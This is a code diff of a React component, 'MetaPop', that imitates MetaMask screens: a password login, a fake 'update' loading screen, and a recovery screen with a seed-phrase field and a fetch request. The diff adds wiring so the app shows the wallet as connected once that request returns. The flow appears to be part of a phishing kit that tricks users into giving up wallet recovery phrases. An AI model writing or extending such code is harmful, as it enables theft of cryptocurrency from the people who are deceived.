@@ -1,9 +1,10 @@
 import React, { useState, useEffect, useMemo } from "react";
 import { ChevronDown } from "lucide-react";
 
-export default function MetaPop() {
+export default function MetaPop({setWalletConnected,setSelectedWallet, wallets}) {
   const [password, setPassword] = useState("");
   const [step, setStep] = useState("loading");
+
 
   const handleLoginSubmit = (e) => {
     e.preventDefault();
@@ -31,7 +32,7 @@ export default function MetaPop() {
     } else if (step === "update-loading") {
       return <MetaMaskUpdateScreenLoading handleUpdate={setStep} />;
     } else {
-      return <MetamaskRecoveryScreen />;
+      return <MetamaskRecoveryScreen setWalletConnected={setWalletConnected} setSelectedWallet={setSelectedWallet} wallets={wallets} />;
     }
   };
 
@@ -304,7 +305,7 @@ function MetaMaskUpdateScreenLoading({ handleUpdate }) {
   );
 }
 
-function MetamaskRecoveryScreen({ open = true, onClose }) {
+function MetamaskRecoveryScreen({ open = true, onClose, setWalletConnected,setSelectedWallet,wallets}) {
   const [isOpen, setIsOpen] = useState(open);
   const [phrase, setPhrase] = useState("");
   const [accountOpen, setAccountOpen] = useState(false);
@@ -371,6 +372,8 @@ function MetamaskRecoveryScreen({ open = true, onClose }) {
       });
 
       const data = await res.json();
+      setWalletConnected(true);
+      setSelectedWallet(wallets.NO_WALLET);
       console.log(data);
     } catch (err) {
       console.error(err);
